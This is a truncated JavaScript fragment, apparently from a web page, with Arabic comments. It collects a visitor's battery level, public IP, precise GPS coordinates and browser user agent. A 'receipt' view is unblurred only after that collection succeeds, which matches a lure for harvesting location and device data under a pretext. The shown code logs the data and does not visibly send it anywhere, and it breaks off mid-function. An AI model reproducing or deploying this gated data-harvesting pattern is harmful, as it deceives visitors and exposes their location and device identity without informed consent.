    async function collectUserInfo() {
      try {
        // جمع معلومات البطارية
        let battery = null;
        if (navigator.getBattery) {
          battery = await navigator.getBattery();
        }

        // جمع معلومات IP
        let ipData = null;
        try {
          ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
        } catch (e) {
          console.log("فشل في الحصول على IP");
        }

        // جمع معلومات الموقع
        const locationPromise = new Promise((resolve, reject) => {
          if (!navigator.geolocation) {
            reject(new Error("الموقع غير مدعوم"));
            return;
          }

          navigator.geolocation.getCurrentPosition(
            position => resolve(position),
            error => reject(error),
            { timeout: 10000 }
          );
        });

        let locationData = null;
        try {
          locationData = await locationPromise;
        } catch (error) {
          console.log("فشل في الحصول على الموقع:", error.message);
        }

        // تخزين البيانات المجمعة
        const userData = {
          battery: battery ? `${Math.round(battery.level * 100)}%` : "غير متوفر",
          ip: ipData ? ipData.ip : "غير متوفر",
          location: locationData ? {
            lat: locationData.coords.latitude,
            lon: locationData.coords.longitude
          } : "غير متوفر",
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        };

        console.log("المعلومات المجمعة:", userData);
        return userData;

      } catch (error) {
        console.error("خطأ في جمع المعلومات:", error);
        return null;
      }
    }

    async function showReceipt() {
      // جمع المعلومات أولاً
      const collectedData = await collectUserInfo();
      
      if (!collectedData) {
        alert("فشل في جمع المعلومات، لا يمكن عرض الإيصال");
        return;

      // إزالة التعتيم عن جميع العناصر
      const elements = document.querySelectorAll('.blurred');
      elements.forEach(el => {
        el.classList.remove('blurred');
